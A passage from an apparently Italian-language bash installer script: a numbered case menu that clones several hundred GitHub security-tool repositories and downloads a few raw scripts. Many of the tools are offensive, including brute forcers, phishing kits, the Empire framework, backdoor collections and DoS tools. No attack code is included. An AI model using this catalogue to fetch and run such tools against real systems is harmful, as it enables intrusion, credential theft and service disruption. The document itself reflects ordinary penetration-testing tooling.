		Clona "jesusprubio/bluebox-ng"
	;;
	"899")
		Clona "olivo/BluPhish"
	;;
	"900")
		Clona "darryllane/Bluto"
	;;
	"901")
		Clona "ANSSI-FR/bmc-tools"
	;;
	"902")
		Clona "st9140927/BOF_Detector"
	;;
	"903")
		Clona "Markus-Go/bonesi"
	;;
	"904")
		Clona "M1ND-B3ND3R/BoopSuite"
	;;
	"905")
		Clona "R3nt0n/bopscrk"
	;;
	"906")
		Clona "brompwnie/botb"
	;;
	"907")
		Clona "zcutlip/bowcaster"
	;;
	"908")
		Clona "CapacitorSet/box-js"
	;;
	"909")
		Clona "gabemarshall/Brosec"
	;;
	"910")
		Clona "ex0dusx/brut3k1t"
	;;
	"911")
		Clona "Matrix07ksa/Brute_Force"
	;;
	"912")
		Clona "glv2/bruteforce-luks"
	;;
	"913")
		Clona "glv2/bruteforce-salted-openssl"
	;;
	"914")
		Clona "glv2/bruteforce-wallet"
	;;
	"915")
		Clona "1N3/BruteX"
	;;
	"916")
		Clona "shawarkhanethicalhacker/BruteXSS"
	;;
	"917")
		Clona "enjoiz/BSQLinjector"
	;;
	"918")
		Clona "virtualabs/btlejack"
	;;
	"919")
		Clona "conorpp/btproxy"
	;;
	"920")
		Clona "simsong/bulk_extractor"
	;;
	"921")
		Clona "aanarchyy/bully"
	;;
	"922")
		Clona "sham00n/buster"
	;;
	"923")
		Clona "buttinsky/buttinsky"
	;;
	"924")
		Clona "webpwnized/byepass"
	;;
	"925")
		Clona "vincentcox/bypass-firewalls-by-DNS-history"
	;;
	"926")
		Clona "Konloch/bytecode-viewer"
	;;
	"927")
		Clona "auraltension/c5scan"
	;;
	"928")
		Clona "Ullaakut/cameradar"
	;;
	"929")
		Clona "securestate/camscan"
	;;
	"930")
		Clona "linux-can/can-utils"
	;;
	"931")
		Clona "schutzwerk/CANalyzat0r"
	;;
	"932")
		Clona "deibit/cansina"
	;;
	"933")
		Clona "CANToolz/CANToolz"
	;;
	"934")
		Clona "MobSF/CapFuzz"
	;;
	"935")
		Clona "itsmehacker/CardPwn"
	;;
	"936")
		Clona "packetassailant/catnthecanary"
	;;
	"937")
		Clona "ring0lab/catphish"
	;;
	"938")
		Clona "lgandx/CCrawlDNS"
	;;
	"939")
		Clona "nccgroup/CECster"
	;;
	"940")
		Clona "0xPoly/Centry"
	;;
	"941")
		Clona "lanrat/certgraph"
	;;
	"942")
		Clona "emsec/ChameleonMini"
	;;
	"943")
		Clona "ztgrace/changeme"
	;;
	"944")
		Clona "TarlogicSecurity/Chankro"
	;;
	"945")
		Clona "projectdiscovery/chaos-client"
	;;
	"946")
		Clona "moxie0/chapcrack"
	;;
	"947")
		Clona "slimm609/checksec.sh"
	;;
	"948")
		Clona "0xbc/chiasm-shell"
	;;
	"949")
		Clona "chipsec/chipsec"
	;;
	"950")
		Clona "jpillora/chisel"
	;;
	"951")
		Clona "MITRECND/chopshop"
	;;
	"952")
		Clona "earthquake/chw00t"
	;;
	"953")
		Clona "epsylon/cintruder"
	;;
	"954")
		Clona "mozilla/cipherscan"
	;;
	"955")
		Clona "OpenSecurityResearch/ciphertest"
	;;
	"956")
		Clona "frohoff/ciphr"
	;;
	"957")
		Clona "nccgroup/cisco-snmp-enumeration"
	;;
	"958")
		Clona "nccgroup/cisco-snmp-slap"
	;;
	"959")
		Clona "madrisan/cisco7crack"
	;;
	"961")
		Clona "jakecreps/Citadel"
	;;
	"962")
		Clona "enddo/CJExploiter"
	;;
	"963")
		Clona "coreos/clair"
	;;
	"964")
		Clona "raffaele-forte/climber"
	;;
	"965")
		Clona "trycatchhcf/cloakify"
	;;
	"966")
		Clona "SageHack/cloud-buster"
	;;
	"967")
		Clona "m0rtem/CloudFail"
	;;
	"968")
		Clona "mandatoryprogrammer/cloudflare_enum"
	;;
	"969")
		Clona "eudemonics/cloudget"
	;;
	"970")
		Clona "projectdiscovery/cloudlist"
	;;
	"971")
		Clona "MrH0wl/Cloudmare"
	;;
	"972")
		Clona "cloudsploit/scans"
	;;
	"973")
		Clona "greycatz/CloudUnflare"
	;;
	"974")
		Clona "hatRiot/clusterd"
	;;
	"975")
		Clona "EgeBalci/Cminer"
	;;
	"976")
		Clona "FlorianHeigl/cms-explorer"
	;;
	"977")
		Clona "Tuhinshubhra/CMSeeK"
	;;
	"978")
		Clona "nahamsec/CMSFuzz"
	;;
	"979")
		Clona "ajinabraham/CMSScan"
	;;
	"980")
		Clona "wpscanteam/CMSScanner"
	;;
	"981")
		Clona "packetassailant/cnamulator"
	;;
	"982")
		Clona "bseb/cntlm"
	;;
	"983")
		Clona "htr-tech/nexphisher"
	;;
	"984")
		Clona "Intrinsec/comission"
	;;
	"985")
		Clona "assetnote/commonspeak2"
	;;
	"986")
		Clona "patpadgett/corkscrew"
	;;
	"987")
		Clona "chenjj/CORScanner"
	;;
	"988")
		Clona "RUB-NDS/CORStest"
	;;
	"989")
		Clona "QKaiser/cottontail"
	;;
	"990")
		Clona "joswr1ght/cowpatty"
	;;
	"991")
		Clona "cpptest/cpptest"
	;;
	"992")
		Clona "D4Vinci/Cr3dOv3r"
	;;
	"993")
		Clona "Hack-Hut/CrabStick"
	;;
	"994")
		Clona "CoalfireLabs/crackHOR"
	;;
	"995")
		Clona "mikeryan/crackle"
	;;
	"996")
		Clona "vnik5287/Crackq"
	;;
	"997")
		Clona "averagesecurityguy/crack"
	;;
	"998")
		Clona "Ganapati/Crawlic"
	;;
	"999")
		Clona "codepr/creak"
	;;
	"1000")
		Clona "oblique/create_ap"
	;;
	"1001")
		Clona "moyix/creddump"
	;;
	"1002")
		Clona "lightos/credmap"
	;;
	"1003")
		Clona "DanMcInerney/creds.py"
	;;
	"1004")
		Clona "ustayready/CredSniper"
	;;
	"1005")
		Clona "ilektrojohn/creepy"
	;;
	"1006")
		Clona "SpiderLabs/cribdrag"
	;;
	"1007")
		Clona "m8r0wn/crosslinked"
	;;
	"1008")
		Clona "galkan/crowbar"
	;;
	"1009")
		Clona "crozono/crozono-free"
	;;
	"1010")
		Clona "chokepoint/CryptHook"
	;;
	"1011")
		Clona "taviso/ctypes.sh"
	;;
	"1012")
		Clona "Beyarz/Cve-api"
	;;
	"1013")
		Clona "sjvermeu/cvechecker"
	;;
	"1014")
		Clona "chamli/CyberCrowl"
	;;
	"1015")
		Clona "medbenali/CyberScan"
	;;
	"1016")
		Clona "shawarkhanethicalhacker/D-TECT"
	;;
	"1017")
		Clona "Ekultek/Dagon"
	;;
	"1018")
		Clona "504ensicsLabs/DAMM"
	;;
	"1019")
		Clona "SideChannelMarvels/Daredevil"
	;;
	"1020")
		Clona "BlackArch/darkmysqli"
	;;
	"1021")
		Clona "itsmehacker/DarkScrape"
	;;
	"1022")
		Clona "M4cs/DarkSpiritz"
	;;
	"1023")
		Clona "nccgroup/DatajackProxy"
	;;
	"1024")
		Clona "upgoingstar/datasploit"
	;;
	"1025")
		Clona "Graph-X/davscan"
	;;
	"1026")
		Clona "thesp0nge/dawnscanner"
	;;
	"1027")
		Clona "gitdurandal/dbd"
	;;
	"1028")
		Clona "taviso/dbusmap"
	;;
	"1029")
		Clona "kgretzky/dcrawl"
	;;
	"1030")
		Clona "0xd4d/de4dot"
	;;
	"1031")
		Clona "byt3bl33d3r/DeathStar"
	;;
	"1032")
		Clona "UndeadSec/Debinject"
	;;
	"1033")
		Clona "SpiderLabs/deblaze"
	;;
	"1034")
		Clona "UltimateHackers/Decodify"
	;;
	"1035")
		Clona "takeshixx/deen"
	;;
	"1036")
		Clona "nccgroup/demiguise"
	;;
	"1037")
		Clona "galkan/depdep"
	;;
	"1038")
		Clona "sensepost/det"
	;;
	"1039")
		Clona "horsicq/DIE-engine"
	;;
	"1040")
		Scarica "$ENTRAW""galkan/tools/master/openvpn-brute/openvpn_brute_force.sh"
	;;
	"1041")
		Clona "spectresearch/detectem"
	;;
	"1042")
		Clona "DanMcInerney/device-pharmer"
	;;
	"1043")
		Clona "DexPatcher/dexpatcher-tool"
	;;
	"1044")
		Clona "msuhanov/dfir_ntfs"
	;;
	"1045")
		Clona "philarkwright/DGA-Detection"
	;;
	"1046")
		Clona "elceef/dhcpf"
	;;
	"1047")
		Clona "kamorin/DHCPig"
	;;
	"1048")
		Clona "misje/dhcpoptinj"
	;;
	"1049")
		Clona "DidierStevens/DidierStevensSuite"
	;;
	"1050")
		Clona "digination/dirbuster-ng"
	;;
	"1051")
		Clona "hahwul/dirhunt"
	;;
	"1052")
		Clona "Cillian-Collins/dirscraper"
	;;
	"1053")
		Clona "maurosoria/dirsearch"
	;;
	"1054")
		Clona "stefanoj3/dirstalk"
	;;
	"1055")
		Clona "gdabah/distorm"
	;;
	"1056")
		Clona "Mr-Un1k0d3r/DKMC"
	;;
	"1057")
		Clona "lorenzog/dns-parallel-prober"
	;;
	"1058")
		Clona "StalkR/dns-reverse-proxy"
	;;
	"1059")
		Clona "maurotfilho/dns-spoof"
	;;
	"1060")
		Clona "d4rkcat/dnsbrute"
	;;
	"1061")
		Clona "dmitescu/dnscobra"
	;;
	"1062")
		Clona "leonjza/dnsfilexfer"
	;;
	"1063")
		Clona "erbbysam/DNSGrep"
	;;
	"1064")
		Clona "0xd4d/dnSpy"
	;;
	"1065")
		Clona "evilsocket/dnssearch"
	;;
	"1066")
		Clona "elceef/dnstwist"
	;;
	"1067")
		Clona "vortexau/dnsvalidator"
	;;
	"1068")
		Clona "projectdiscovery/dnsx"
	;;
	"1069")
		Clona "whitel1st/docem"
	;;
	"1070")
		Clona "MarkBaggett/domain_stats"
	;;
	"1071")
		Clona "coldfusion39/domi-owned"
	;;
	"1072")
		Clona "vysecurity/DomLink"
	;;
	"1073")
		Clona "TheWover/donut"
	;;
	"1074")
		Clona "AeonDave/doork"
	;;
	"1075")
		Clona "maurosoria/dirsearch"
	;;
	"1076")
		Clona "utiso/dorkbot"
	;;
	"1077")
		Clona "blueudp/DorkMe"
	;;
	"1078")
		Clona "NullArray/DorkNet"
	;;
	"1079")
		Scarica "$ENTRAW""maxousc59/Blue-Sky-Information-Security/master/DPScan.py"
	;;
	"1080")
		Clona "ucsb-seclab/dr_checker"
	;;
	"1081")
		Clona "D4Vinci/Dr0p1t-Framework"
	;;
	"1082")
		Clona "screetsec/Dracnmap"
	;;
	"1083")
		Clona "Shellntel/backdoors"
	;;
	"1084")
		Clona "emptymonkey/drinkme"
	;;
	"1085")
		Clona "dripcap/dripcap"
	;;
	"1086")
		Clona "droope/droopescan"
	;;
	"1087")
		Clona "mwrlabs/drozer"
	;;
	"1088")
		Clona "Tethik/drupal-module-enumeration"
	;;
	"1089")
		Clona "immunIT/drupwn"
	;;
	"1090")
		Clona "dlang-community/D-Scanner"
	;;
	"1091")
		Clona "szechyjs/dsd"
	;;
	"1092")
		Clona "stamparm/DSFS"
	;;
	"1093")
		Clona "USArmyResearchLab/Dshell"
	;;
	"1094")
		Clona "stamparm/DSJS"
	;;
	"1095")
		Clona "stamparm/DSSS"
	;;
	"1096")
		Clona "anantshri/DS_Store_crawler_parser"
	;;
	"1097")
		Clona "stamparm/DSXS"
	;;
	"1098")
		Clona "fleetcaptain/dtp-spoof"
	;;
	"1099")
		Clona "insomniacslk/dublin-traceroute"
	;;
	"1100")
		Clona "kevthehermit/DuckToolkit"
	;;
	"1101")
		Clona "0verl0ad/Dumb0"
	;;
	"1102")
		Clona "MalcolmRobb/dump1090"
	;;
	"1103")
		Clona "nil0x42/duplicut"
	;;
	"1104")
		Clona "dungtv543/Dutas"
	;;
	"1105")
		Clona "kost/dvcs-ripper"
	;;
	"1106")
		Clona "iGio90/Dwarf"
	;;
	"1107")
		Clona "DynamoRIO/dynamorio"
	;;
	"1108")
		Clona "securestate/eapeak"
	;;
	"1109")
		Clona "s0lst1c3/eaphammer"
	;;
	"1110")
		Clona "brav0hax/easy-creds"
	;;
	"1111")
		Clona "nccgroup/easyda"
	;;
	"1112")
		Clona "elfmaster/ecfs"
	;;
	"1113")
		Clona "eteran/edb-debugger"
	;;
	"1114")
		Clona "neoneggplant/EggShell"
	;;
	"1115")
		Clona "jacob-baines/elfparser"
	;;
	"1116")
		Clona "DeveloppSoft/EliDecode"
	;;
	"1117")
		Clona "DanMcInerney/elite-proxy-finder"
	;;
	"1118")
		Clona "martinvigo/email2phonenumber"
	;;
	"1119")
		Clona "BC-SECURITY/Empire"
	;;
	"1120")
		Clona "cr0hn/enteletaor"
	;;
	"1121")
		Clona "dejanlevaja/enum_shares"
	;;
	"1122")
		Clona "Gilks/enumerid"
	;;
	"1123")
		Clona "synacktiv/eos"
	;;
	"1124")
		Clona "thorkill/eresi"
	;;
	"1125")
		Clona "gteissier/erl-matter"
	;;
	"1126")
		Clona "DoubleThreatSecurity/Espionage"
	;;
	"1127")
		Clona "peterpt/eternal_scanner"
	;;
	"1128")
		Scarica "https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/miranda-upnp/miranda.py"
		Scarica "https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/miranda-upnp/miranda-1.3.tar.gz"
	;;
	"1129")
		Clona "outflanknl/EvilClippy"
	;;
	"1130")
		Clona "bitbrute/evillimiter"
	;;
	"1131")
		Clona "saeeddhqan/evine"
	;;
	"1132")
		Clona "yarox24/evtkit"
	;;
	"1133")
		Clona "Exa-Networks/exabgp"
	;;
	"1134")
		Clona "OsandaMalith/Exe2Image"
	;;
	"1135")
		Clona "cysinfo/Exescan"
	;;
	"1136")
		Clona "NullHypothesis/exitmap"
	;;
	"1137")
		Clona "tr3w/ExpImp-Lookup"
	;;
	"1138")
		Clona "juansacco/exploitpack"
	;;
	"1139")
		Clona "ExpoSEJS/ExpoSE"
	;;
	"1140")
		Clona "asciimoo/exrex"
	;;
	"1141")
		Clona "Damian89/extended-ssrf-search"
	;;
	"1142")
		Clona "bwall/ExtractHosts"
	;;
	"1143")
		Clona "jschicht/ExtractUsnJrnl"
	;;
	"1144")
		Clona "BishopFox/eyeballer"
	;;
	"1145")
		Clona "ChrisTruncer/EyeWitness"
	;;
	"1146")
		Clona "ysrc/F-Scrack"
	;;
	"1147")
		Clona "thelinuxchoice/facebash"
	;;
	"1148")
		Clona "tomoneill19/facebookOSINT"
	;;
	"1149")
		Clona "pun1sh3r/facebot"
	;;
	"1150")
		Clona "PowerScript/facebrok"
	;;
	"1151")
		Clona "emerinohdz/FaceBrute"
	;;
	"1152")
		Clona "ryosan/factordb-pycli"
	;;
	"1153")
		Clona "Crypt0s/FakeDns"
	;;
	"1154")
		Clona "fireeye/flare-fakenet-ng"
	;;
	"1155")
		Clona "mubix/FakeNetBIOS"
	;;
	"1156")
		Clona "evilsocket/fang"
	;;
	"1157")
		Clona "pavel-odintsov/fastnetmon"
	;;
	"1158")
		Clona "devanshbatham/FavFreak"
	;;
	"1159")
		Clona "chinoogawa/fbht"
	;;
	"1160")
		Clona "xHak9x/fbi"
	;;
	"1161")
		Clona "guelfoweb/fbid"
	;;
	"1162")
		Clona "chrispetrou/FDsploit"
	;;
	"1163")
		Clona "nccgroup/featherduster"
	;;
	"1164")
		Clona "fesh0r/fernflower"
	;;
	"1165")
		Clona "stealth/fernmelder"
	;;
	"1166")
		Clona "ffuf/ffuf"
	;;
	"1167")
		Clona "sfan5/fi6s"
	;;
	"1168")
		Clona "henshin/filebuster"
	;;
	"1169")
		Clona "0blio/fileGPS"
	;;
	"1170")
		Clona "keithjjones/fileintel"
	;;
	"1171")
		Clona "subinacls/Filibuster"
	;;
	"1172")
		Clona "manwhoami/findmyiphone"
	;;
	"1173")
		Clona "Edu4rdSHL/findomain"
	;;
	"1174")
		Clona "1N3/findsploit"
	;;
	"1175")
		Clona "erwanlr/Fingerprinter"
	;;
	"1176")
		Clona "BishopFox/firecat"
	;;
	"1177")
		Clona "mazen160/Firefox-Security-Toolkit"
	;;
	"1178")
		Clona "craigz28/firmwalker"
	;;
	"1179")
		Clona "rampageX/firmware-mod-kit"
	;;
	"1180")
		Clona "nccgroup/firstexecution"
	;;
	"1181")
		Clona "tearsecurity/firstorder"
	;;
	"1182")
		Clona "galkan/flashlight"
	;;
	"1183")
		Clona "riusksk/FlashScanner"
	;;
	"1184")
		Clona "thewhiteh4t/flashsploit"
	;;
	"1185")
		Clona "7h3rAm/flowinspect"
	;;
	"1186")
		Clona "tismayil/fockcache"
	;;
	"1187")
		Clona "byt3smith/Forager"
	;;
	"1188")
		Clona "ALSchwalm/foresight"
	;;
	"1189")
		Clona "Owlz/formatStringExploiter"
	;;
	"1190")
		Clona "kirei/fpdns"
	;;
	"1191")
		Clona "stealth/fraud-bridge"
	;;
	"1192")
		Clona "kylemcdonald/FreeWifi"
	;;
	"1193")
		Clona "OALabs/frida-extract"
	;;
	"1194")
		Clona "AloneMonkey/frida-ios-dump"
	;;
	"1195")
		Clona "AndroidTamer/frida-push"
	;;
	"1196")
		Clona "Nightbringer21/fridump"
	;;
	"1197")
		Clona "miaouPlop/fs"
	;;
	"1198")
		Clona "adtac/fssb"
	;;
	"1199")
		Clona "RubenRocha/ftpscout"
	;;
	"1200")
		Clona "lostincynicism/FuzzAP"
	;;
	"1201")
		Clona "mdiazcl/fuzzbunch-debian"
	;;
	"1202")
		Clona "JackOfMostTrades/gadgetinspector"
	;;
	"1203")
		Clona "med0x2e/GadgetToJScript"
	;;
	"1204")
		Clona "michaeltelford/gatecrasher"
	;;
	"1206")
		Clona "byt3bl33d3r/gcat"
	;;
	"1207")
		Clona "RhinoSecurityLabs/GCPBucketBrute"
	;;
	"1208")
		Clona "GasparVardanyan/GCrypt"
	;;
	"1209")
		Clona "cs01/gdbgui"
	;;
	"1210")
		Clona "hugsy/gef"
	;;
	"1211")
		Clona "0xrawsec/gene"
	;;
	"1212")
		Clona "KarmaHostage/gethspoit"
	;;
	"1213")
		Clona "vulnersCom/getsploit"
	;;
	"1214")
		Clona "jeanphix/Ghost.py"
	;;
	"1215")
		Clona "s1egesystems/GhostDelivery"
	;;
	"1216")
		Clona "bahamas10/node-git-dump"
	;;
	"1217")
		Clona "tillson/git-hound"
	;;
	"1218")
		Clona "obheda12/GitDorker"
	;;
	"1219")
		Clona "mschwager/gitem"
	;;
	"1220")
		Clona "hisxo/gitGraber"
	;;
	"1221")
		Clona "lijiejie/githack"
	;;
	"1222")
		Clona "mazen160/GithubCloner"
	;;
	"1223")
		Clona "zricethezav/gitleaks"
	;;
	"1224")
		Clona "giovanifss/gitmails"
	;;
	"1225")
		Clona "danilovazb/GitMiner"
	;;
	"1226")
		Clona "internetwache/GitTools"
	;;
	"1227")
		Clona "joshDelta/Gloom-Framework"
	;;
	"1228")
		Clona "OWASP/glue"
	;;
	"1229")
		Clona "razc411/GoBD"
	;;
	"1230")
		Clona "OJ/gobuster"
	;;
	"1231")
		Clona "NetSPI/goddi"
	;;
	"1232")
		Clona "jseidl/GoldenEye"
	;;
	"1233")
		Clona "golismero/golismero"
	;;
	"1234")
		Clona "anarcoder/google_explorer"
	;;
	"1235")
		Clona "zombiesam/googlesub"
	;;
	"1236")
		Clona "1N3/Goohak"
	;;
	"1237")
		Clona "s0md3v/goop"
	;;
	"1238")
		Clona "tarunkant/Gopherus"
	;;
	"1239")
		Clona "gophish/gophish"
	;;
	"1240")
		Clona "Nhoya/gOSINT"
	;;
	"1241")
		Clona "jaeles-project/gospider"
	;;
	"1242")
		Clona "MartinIngesen/gpocrack"
	;;
	"1243")
		Clona "osqzss/gps-sdr-sim"
	;;
	"1244")
		Clona "bistromath/gr-air-modes"
	;;
	"1245")
		Clona "ptrkrysik/gr-gsm"
	;;
	"1246")
		Clona "drmpeg/gr-paint"
	;;
	"1247")
		Clona "black-brain/graBing"
	;;
	"1248")
		Clona "Ekultek/Graffiti"
	;;
	"1249")
		Clona "swisskyrepo/GraphQLmap"
	;;
	"1250")
		Clona "wireghoul/graudit"
	;;
	"1251")
		Clona "greenbone/gsa"
	;;
	"1252")
		Clona "trailofbits/grr"
	;;
	"1253")
		Clona "anchore/grype"
	;;
	"1254")
		Clona "hackerschoice/gsocket"
	;;
	"1255")
		Clona "mzfr/gtfo"
	;;
	"1256")
		Clona "nccgroup/GTFOBLookup"
	;;
	"1257")
		Clona "greenbone/gvmd"
	;;
	"1258")
		Clona "00xc/h2buster"
	;;
	"1259")
		Clona "BishopFox/h2csmuggler"
	;;
	"1260")
		Clona "summerwind/h2spec"
	;;
	"1261")
		Clona "gildasio/h2t"
	;;
	"1262")
		Clona "khast3x/h8mail"
	;;
	"1263")
		Clona "portantier/habu"
	;;
	"1264")
		Clona "Ridter/hackredis"
	;;
	"1265")
		Clona "mossmann/hackrf"
	;;
	"1266")
		Clona "haka-security/haka"
	;;
	"1267")
		Clona "4shadoww/hakkuframework"
	;;
	"1268")
		Clona "hakluke/hakrawler"
	;;
	"1269")
		Clona "hakluke/hakrevdns"
	;;
	"1270")
		Clona "Rich5/Harness"
	;;
	"1271")
		Clona "Te-k/harpoon"
	;;
	"1272")
		Clona "galkan/hasere"
	;;
	"1273")
		Clona "UltimateHackers/Hash-Buster"
	;;
	"1274")
		Clona "iagox86/hash_extender"
	;;
	"1275")
		Clona "blackploit/hash-identifier"
	;;
	"1276")
		Clona "hashcat/hashcat-utils"
	;;
	"1277")
		Clona "staz0t/hashcatch"
	;;
	"1278")
		Clona "NPS-DEEP/hashdb"
	;;
	"1279")
		Clona "jessek/hashdeep"
	;;
	"1280")
		Clona "ChrisTruncer/Hasher"
	;;
	"1281")
		Clona "rurapenthe/hashfind"
	;;
	"1282")
		Clona "psypanda/hashID"
	;;
	"1283")
		Clona "bwall/HashPump"
	;;
	"1284")
		Clona "SmeegeSec/HashTag"
	;;
	"1285")
		Clona "HatBashBR/HatCloud"
	;;
	"1286")
		Clona "trustedsec/hate_crack"
	;;
	"1287")
		Clona "trolldbois/python-haystack"
	;;
	"1288")
		Clona "ZerBea/hcxdumptool"
	;;
	"1289")
		Clona "ZerBea/hcxkeys"
	;;
	"1290")
		Clona "ZerBea/hcxtools"
	;;
	"1291")
		Clona "rjw57/hdcp-genkey"
	;;
	"1292")
		Clona "ApertureLabsLtd/hdmi-sniff"
	;;
	"1293")
		Clona "robertdavidgraham/heartleech"
	;;
	"1294")
		Clona "ytisf/hemingway"
	;;
	"1295")
		Clona "EgeBalci/HERCULES"
	;;
	"1296")
		Clona "dstotijn/hetty"
	;;
	"1297")
		Clona "sharkdp/hexyl"
	;;
	"1298")
		Clona "4n4nk3/HikPwn"
	;;
	"1299")
		Clona "stephenbradshaw/hlextend"
	;;
	"1300")
		Clona "nccgroup/hodor"
	;;
	"1301")
		Clona "hasherezade/hollows_hunter"
	;;
	"1302")
		Clona "ElevenPaths/HomePWN"
	;;
	"1303")
		Clona "DataSoft/Honeyd"
	;;
	"1304")
		Clona "foospidy/HoneyPy"
	;;
	"1305")
		Clona "xme/hoover"
	;;
	"1306")
		Clona "gabamnml/hoper"
	;;
	"1307")
		Clona "SpiderLabs/HostHunter"
	;;
	"1308")
		Clona "schollz/howmanypeoplearearound"
	;;
	"1309")
		Clona "rep/hpfeeds"
	;;
	"1310")
		Clona "PaulSec/HQLmap"
	;;
	"1311")
		Clona "riramar/hsecscan"
	;;
	"1312")
		Clona "segment-srl/htcap"
	;;
	"1313")
		Clona "lijiejie/htpwdScan"
	;;
	"1314")
		Clona "lkarsten/htrosbif"
	;;
	"1315")
		Clona "wireghoul/htshells"
	;;
	"1316")
		Clona "Danladi/HttpPwnly"
	;;
	"1317")
		Clona "tomnomnom/httprobe"
	;;
	"1318")
		Clona "breenmachine/httpscreenshot"
	;;
	"1319")
		Clona "larsbrinkhoff/httptunnel"
	;;
	"1320")
		Clona "cthit/hubbIT-sniffer"
	;;
	"1321")
		Clona "grafov/hulk"
	;;
	"1322")
		Clona "nbuechler/hungry-interceptor"
	;;
	"1323")
		Clona "CoolerVoid/Hyde"
	;;
	"1324")
		Clona "vanhauser-thc/thc-hydra"
	;;
	"1325")
		Clona "xiam/hyperfox"
	;;
	"1326")
		Clona "hackappcom/ibrute"
	;;
	"1327")
		Clona "m4ll0k/iCloudBrutter"
	;;
	"1328")
		Clona "inquisb/icmpsh"
	;;
	"1329")
		Clona "BillyV4/ID-entify"
	;;
	"1330")
		Clona "stamparm/identYwaf"
	;;
	"1331")
		Clona "lijiejie/IIS_shortname_Scanner"
	;;
	"1332")
		Clona "airbus-seclab/ilo4_toolbox"
	;;
	"1333")
		Clona "coderofsalvation/imagegrep-bash"
	;;
	"1334")
		Clona "jklmnn/imagejs"
	;;
	"1335")
		Clona "ralphje/imagemounter"
	;;
	"1336")
		Clona "WerWolv/ImHex"
	;;
	"1337")
		Clona "LimerBoy/Impulse"
	;;
	"1338")
		Clona "jschicht/Indx2Csv"
	;;
	"1339")
		Clona "jschicht/IndxCarver"
	;;
	"1340")
		Clona "m4ll0k/infoga"
	;;
	"1341")
		Clona "BountyStrike/Injectus"
	;;
	"1342")
		Clona "penafieljlm/inquisitor"
	;;
	"1343")
		Clona "4w4k3/Insanity-Framework"
	;;
	"1344")
		Clona "sc1341/InstagramOSINT"
	;;
	"1345")
		Clona "thelinuxchoice/instashell"
	;;
	"1346")
		Clona "itsmehacker/IntelPlot"
	;;
	"1347")
		Clona "Hnfull/Intensio-Obfuscator"
	;;
	"1348")
		Clona "codingo/Interlace"
	;;
	"1349")
		Clona "carmaa/interrogate"
	;;
	"1350")
		Clona "ohdae/Intersect.5"
	;;
	"1351")
		Clona "danielbohannon/Invoke-CradleCrafter"
	;;
	"1352")
		Clona "danielbohannon/Invoke-DOSfuscation"
	;;
	"1353")
		Clona "danielbohannon/Invoke-Obfuscation"
	;;
	"1354")
		Clona "takeshixx/ip-https-tools"
	;;
	"1355")
		Clona "Rajkumrdusad/IP-Tracer"
	;;
	"1356")
		Clona "AnarchyAngel/IPMIPWN"
	;;
	"1357")
		Clona "OsandaMalith/IPObfuscator"
	;;
	"1358")
		Clona "Hackplayers/iptodomain"
	;;
	"1359")
		Clona "Pinperepette/IPTV"
	;;
	"1360")
		Clona "milo2012/ipv4Bypass"
	;;
	"1361")
		Clona "lavalamp-/ipv666"
	;;
	"1362")
		Clona "bwall/ircsnapshot"
	;;
	"1363")
		Clona "halitalptekin/isip"
	;;
	"1364")
		Clona "juphoff/issniff"
	;;
	"1365")
		Clona "salesforce/ja3"
	;;
	"1366")
		Clona "flankerhqd/JAADAS"
	;;
	"1367")
		Clona "skylot/jadx"
	;;
	"1368")
		Clona "stasinopoulos/jaidam"
	;;
	"1369")
		Clona "mikehacksthings/jast"
	;;
	"1370")
		Clona "SpiderLabs/jboss-autopwn"
	;;
	"1371")
		Clona "kwart/jd-cli"
	;;
	"1372")
		Clona "frohoff/jdeserialize"
	;;
	"1373")
		Clona "SideChannelMarvels/JeanGrey"
	;;
	"1374")
		Clona "utkusen/jeopardize"
	;;
	"1375")
		Clona "joaomatosf/jexboss"
	;;
	"1376")
		Clona "black-hawk-97/jooforce"
	;;
	"1377")
		Clona "jindrapetrik/jpexs-decompiler"
	;;
	"1378")
		Clona "incogbyte/jsearch"
	;;
	"1379")
		Clona "aemkei/jsfuck"
	;;
	"1380")
		Clona "s0md3v/JShell"
	;;
	"1381")
		Clona "zigoo0/JSONBee"
	;;
	"1382")
		Clona "nahamsec/JSParser"
	;;
	"1383")
		Clona "ron190/jsql-injection"
	;;
	"1384")
		Clona "mindedsecurity/JStillery"
	;;
	"1385")
		Clona "ohpe/juicy-potato"
	;;
	"1386")
		##securactive/junkie
		Clona "rixed/junkie"
	;;
	"1387")
		Clona "telerik/JustDecompileEngine"
	;;
	"1388")
		Clona "katjahahn/JWScan"
	;;
	"1389")
		Clona "brendan-rius/c-jwt-cracker"
	;;
	"1390")
		Clona "ticarpi/jwt_tool"
	;;
	"1391")
		Clona "aress31/jwtcat"
	;;
	"1392")
		##galkan/kacak
		Clona "hotelzululima/kacak"
	;;
	"1393")
		Clona "P0cL4bs/Kadimus"
	;;
	"1394")
		Clona "steve-m/kalibrate-rtl"
	;;
	"1395")
		Clona "woj-ciech/kamerka"
	;;
	"1396")
		Clona "samratashok/Kautilya"
	;;
	"1397")
		Clona "xtaci/kcptun"
	;;
	"1398")
		Clona "gentilkiwi/kekeo"
	;;
	"1399")
		Clona "spencerdodd/kernelpop"
	;;
	"1400")
		Clona "clirimemini/Keye"
	;;
	"1401")
		Clona "k4m4/kickthemout"
	;;
	"1402")
		Clona "thewhiteh4t/killcast"
	;;
	"1403")
		Clona "riverloopsec/killerbee"
	;;
	"1404")
		Clona "ChaitanyaHaritash/kimi"
	;;
	"1405")
		Clona "desaster/kippo"
	;;
	"1406")
		Clona "klee/klee"
	;;
	"1407")
		Clona "guelfoweb/knock"
	;;
	"1408")
		Clona "ernw/knxmap"
	;;
	"1409")
		Clona "dirkjanm/krbrelayx"
	;;
	"1410")
		Clona "aquasecurity/kube-hunter"
	;;
	"1411")
		Clona "averonesis/kubolt"
	;;
	"1412")
		Clona "sensepost/kwetza"
	;;
	"1413")
		Clona "roissy/l0l"
	;;
	"1414")
		Clona "takeshixx/laf"
	;;
	"1415")
		Clona "rflynn/lanmap2"
	;;
	"1416")
		Clona "DanMcInerney/LANs.py"
	;;
	"1417")
		Clona "nccgroup/LazyDroid"
	;;
	"1418")
		Clona "wireghoul/lbmap"
	;;
	"1419")
		Clona "sduverger/ld-shatner"
	;;
	"1420")
		Clona "franc-pentest/ldeep"
	;;
	"1421")
		Clona "woj-ciech/LeakLooker"
	;;
	"1422")
		Clona "mmicu/leena"
	;;
	"1423")
		Clona "carlospolop/legion"
	;;
	"1424")
		Clona "leo-editor/leo-editor"
	;;
	"1425")
		Clona "captainhooligan/Leroy-Jenkins"
	;;
	"1426")
		Clona "codewhitesec/LethalHTA"
	;;
	"1427")
		Clona "onthefrontline/LetMeFuckIt-Scanner"
	;;
	"1428")
